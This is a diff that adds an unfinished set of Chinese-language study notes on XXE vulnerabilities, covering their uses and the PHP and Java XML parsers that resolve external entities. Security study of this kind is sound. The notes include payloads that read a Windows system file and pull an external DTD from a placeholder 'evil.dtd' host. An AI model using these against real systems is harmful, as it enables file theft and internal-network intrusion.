@@ -1,0 +1,30 @@
+1、XXE功能
+   利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，
+   内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用。
+   分为有回显和无回显的情况：
+   1.1 有回显
+     1.1.1 <!DOCTYPE foo [<!ELEMENT foo ANY >
+           <!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" >]>
+           <foo>&xxe;</foo>
+     1.1.2 <!DOCTYPE foo [<!ELEMENT foo ANY >
+           <!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
+           %xxe;]>
+           <foo>&evil;</foo>
+4.<foo>&evil;</foo>
+   1.2 无回显
+
+2、xml组件及函数中出现的问题：
+    2.1 PHP中，xml_parse 和 simplexml_load;xml_parse的实现方式为expat库，默认情况不会解析外部实体,
+        而simplexml_load默认情况下会解析外部实体,造成安全威胁.
+    2.2 JAVA中常用的XML第三方库，如果不禁用DTD、Entity都会导致XXE漏洞；
+        javax.xml.stream.XMLStreamReader;
+        javax.xml.parsers.DocumentBuilderFactory;
+        org.dom4j.io.SAXReader;
+        org.xml.sax.helpers.XMLReaderFactory;
+        javax.xml.parsers.SAXParser;
+        javax.xml.parsers.DocumentBuilder;
+        org.jdom.input.SAXBuilder;
+        org.dom4j.DocumentHelper;
+        org.jdom.output.XMLOutputter;
+
+    2.3
